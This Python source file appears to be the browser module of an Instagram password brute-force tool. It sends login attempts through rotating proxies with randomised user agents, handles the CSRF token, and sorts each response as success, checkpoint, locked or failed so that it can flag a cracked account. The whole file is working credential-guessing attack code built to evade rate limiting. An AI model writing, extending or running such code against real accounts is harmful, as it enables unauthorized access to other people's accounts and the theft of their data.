# Date: 12/28/2018
# Author: Mohamed
# Description: Browser

import typing
from time import time
from random import choice

import requests
from datetime import datetime
from requests_html import HTMLSession
from .const import browser_data, response_codes, fetch_time, user_agents, debug


from lib import proxy


class Browser(object):

    account_exists = None

    def __init__(self, username, password, proxy: proxy.Proxy):
        self.proxy = proxy
        self.is_found = False
        self.is_active = True
        self.is_locked = False
        self.start_time = None
        self.username = username
        self.password = password
        self.is_attempted = False
        self.__browser = None

    @property
    def browser(self):
        if self.__browser is None:
            header = browser_data["header"]
            header["user-agent"] = choice(user_agents)

            session = HTMLSession()
            session.headers.update(header)

            session.proxies.update(self.proxy.addr)
            session.trust_env = False

            self.__browser = session
        return self.__browser

    def get_token(self):

        try:
            return self.browser.get(
                browser_data["home_url"],
                timeout=fetch_time,
            ).cookies.get_dict()["csrftoken"]
        except Exception as e:
            pass

    def post_data(self):
        enc_password = "#PWD_INSTAGRAM_BROWSER:0:{}:{}".format(
            int(datetime.now().timestamp()), self.password
        )

        data = {
            browser_data["username_field"]: self.username,
            browser_data["password_field"]: enc_password,
        }

        try:
            resp = self.browser.post(
                browser_data["login_url"],
                data=data,
                timeout=fetch_time,
            ).json()

            self.proxy.incr_success()
            return resp
        except:
            pass

    def check_exists(self, response):
        if "user" in response:
            Browser.account_exists = response["user"]

    def check_response(self, response):
        if "authenticated" in response:
            if response["authenticated"]:
                return response_codes["succeed"]

        if "message" in response:
            if response.get("checkpoint_url", None):
                return response_codes["succeed"]

            if response["status"] == "fail":
                return response_codes["locked"]

        if "errors" in response:
            return response_codes["locked"]

        return response_codes["failed"]

    def get_ip(self) -> typing.Optional[str]:
        url = "https://api.ipify.org/"

        try:
            r = self.browser.get(url, timeout=fetch_time)
            return r.text
        except Exception as e:
            pass

    def authenicate(self):
        response = self.post_data()
        resp = {"attempted": False, "accessed": False, "locked": False}

        if debug:
            ip = self.get_ip()
            print(f"pass: {self.password}[{ip}] => {response}")

        if response != None:
            resp["attempted"] = True
            resp_code = self.check_response(response)

            if resp_code == response_codes["locked"]:
                resp["locked"] = True

            if resp_code == response_codes["succeed"]:
                resp["accessed"] = True

            if Browser.account_exists == None:
                self.check_exists(response)

        return resp

    def attempt(self):
        self.start_time = time()
        token = self.get_token()

        if token:
            self.browser.headers.update({"x-csrftoken": token})
            resp = self.authenicate()

            if resp["attempted"]:
                self.is_attempted = True

                if not resp["locked"]:
                    if resp["accessed"]:
                        self.is_found = True
                else:
                    self.is_locked = True
        self.close()

    def close(self):
        self.browser.close()
        self.is_active = False
